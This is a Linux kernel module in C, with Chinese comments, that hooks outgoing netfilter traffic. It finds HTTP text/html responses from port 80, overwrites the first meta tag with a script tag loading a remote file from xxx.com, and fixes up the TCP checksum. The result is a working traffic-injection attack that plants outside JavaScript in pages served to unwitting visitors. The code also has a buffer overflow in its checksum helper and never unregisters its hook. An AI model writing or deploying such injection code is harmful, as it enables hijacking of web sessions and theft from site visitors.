#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/inet.h>
#include <linux/types.h>
#include <linux/string.h>
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>
#include <linux/hash.h>
#include <linux/ctype.h>
#include <linux/time.h>

struct http_info
{
    int clen;   /* content length */
    int ctype;  /* content type */
};

static struct nf_hook_ops nfho;

#define IP_ADDR_LEN 6
#define printf printk

char *modify_data = "<script src=\"http://xxx.com/test.js\"></script>";

uint16_t ip_chksum(uint16_t initcksum, uint8_t *ptr, int len)
{
    unsigned int cksum;
    int idx;
    int odd;

    cksum = (unsigned int) initcksum;

    odd = len & 1;
    len -= odd;

    for (idx = 0; idx < len; idx += 2) {
		cksum += ((unsigned long) ptr[idx] << 8) + ((unsigned long) ptr[idx+1]);
	}

    if (odd) {		/* buffer is odd length */
		cksum += ((unsigned long) ptr[idx] << 8);
	}

    /*
     * Fold in the carries
     */

    while (cksum >> 16) {
		cksum = (cksum & 0xFFFF) + (cksum >> 16);
	}

    return cksum;
}

uint16_t tcp_chksum(uint16_t initcksum, uint8_t *tcphead, int tcplen , uint32_t *srcaddr, uint32_t *destaddr)
{
	uint8_t pseudoheader[12];
	uint16_t calccksum;
	
	memcpy(&pseudoheader[0],srcaddr,IP_ADDR_LEN);
    memcpy(&pseudoheader[4],destaddr,IP_ADDR_LEN);
    pseudoheader[8] = 0; /* 填充零 */
    pseudoheader[9] = IPPROTO_TCP;
    pseudoheader[10] = (tcplen >> 8) & 0xFF;
    pseudoheader[11] = (tcplen & 0xFF);
	
	calccksum = ip_chksum(0,pseudoheader,sizeof(pseudoheader));
    calccksum = ip_chksum(calccksum,tcphead,tcplen);
    calccksum = ~calccksum;
    return calccksum;
}

char *readline_from_buf(char *from, char *end, char *to, int to_len)
{
    int i = 0;

    memset(to, 0x0, to_len);

    for(i = 0; i < to_len && i < end - from; i++)
    {
        
        if(from[i] == '\r' && from[i + 1] == '\n')
        {
            if(i == 0)
            {
                return NULL;
            }
            memcpy(to, from, i);
            return from + i + 2;
        }
    }
    return NULL;
}

/* 不区分大小写的strstr */
char *strncasestr(char *str, char *sub, int n)
{
    if(!str || !sub)
        return NULL;

    int len = strlen(sub);
    if (len == 0)
    {
        return NULL;
    }

    while (*str && n--)
    {
        if (strncasecmp(str, sub, len) == 0)
        {
            return str;
        }
        ++str;
    }
    return NULL;
}


/* 判断http头是否是text/html类型 */
int is_text_type(char *head, int len)
{
    char *p = head; 
    char *end = head + len;
    char line[1024] = {0};
    
    while((p = readline_from_buf(p, end, line, sizeof(line))))
    {
        //printk("%s\n", line);
        if(!strncasecmp(line, "Content-type: text/html", strlen("Content-type: text/html")))
        {
            printk("########is ok############\n");
            return 1;
        }
    }

    return 0;
}

void print_nchar(char *s, int n)
{
    while(*s && n--)
        printf("%c", *s++);
    
    printf("\n");
}

/* 使用src字符串替换dest字符串内容，长度为dlen，不足的补空格 */
void replace_string(char *dest, char *src, int dlen)
{
    if(!dest || !src)
        return;

    while(*dest && *src && dlen--)
        *dest++ = *src++;

    if(dlen && *dest)
    {
        while(dlen--)
            *dest++ = ' ';
    }
}

/* 这个函数还有诸多问题，例如如果第一个meta标签长度不够，不会继续匹配其他meta标签 */
int modify_meta_mark(__u8 *tcpdata, int len)
{
    char *start = NULL, *end = NULL;
    
    start = strncasestr(tcpdata, "<meta", len);
    if(!start)
        return 0;

    end = strnchr(start, len - (start - (char *)tcpdata), '>');
    end++;

    print_nchar(start, end - start);

    if(end - start < strlen(modify_data))
        return 0;

    replace_string(start, modify_data, end - start);

    print_nchar(start, end - start);

    return 1;
}

void try_modify_http(struct iphdr * iph)
{
    struct tcphdr *tcph = (void*)iph + iph->ihl*4;
    __u8 *tcpdata = (void*)tcph + tcph->doff*4;
    int len = ntohs(iph->tot_len) - (iph->ihl*4) - (tcph->doff*4);
    __u16 orig_cksum = ntohs(tcph->check);
    __u16 new_cksum = 0;
    
    if(modify_meta_mark(tcpdata, len))
    {
        /* 先清零 */
        tcph->check = 0;
        new_cksum = tcp_chksum(0, tcph, len + tcph->doff*4, &iph->saddr, &iph->daddr);
        tcph->check = htons(new_cksum);
    }
    
}

void http_handle(struct iphdr *iph)
{
    struct tcphdr *tcph = (void*)iph + iph->ihl*4;
    __u8 *tcpdata = (void*)tcph + tcph->doff*4;
    int len = ntohs(iph->tot_len) - (iph->ihl*4) - (tcph->doff*4);

    if(len < 7 || memcmp(tcpdata, "HTTP/1.", 7))/* HTTP/1.1 */
        return;

    /* 如果不是text/html直接return */
    if(!is_text_type(tcpdata, len))
        return;

    try_modify_http(iph);
}


unsigned int hook_func(unsigned int hooknum,
                       struct sk_buff *skb,
                       const struct net_device *in,
                       const struct net_device *out,
                       int (*okfn)(struct sk_buff*))
{
    struct iphdr* iph = ip_hdr(skb);

    struct tcphdr *tcph;

    if (iph->protocol != IPPROTO_TCP) /* not TCP */
        return NF_ACCEPT;

    tcph = (void*)iph + iph->ihl*4;

    if(tcph->source == htons(80))
    {
        http_handle(iph);
        return NF_ACCEPT;
    }

    return NF_ACCEPT;
}


int init_module()
{
    printk("init module\n");
    
    nfho.hook = hook_func;
    nfho.hooknum = NF_INET_POST_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    
    if(nf_register_hook(&nfho))
        printk("register hook failed\n");
    else
        printk("register hook successed\n");


    return 0;
}

void cleanup_module()
{
    printk("exit module\n");
}


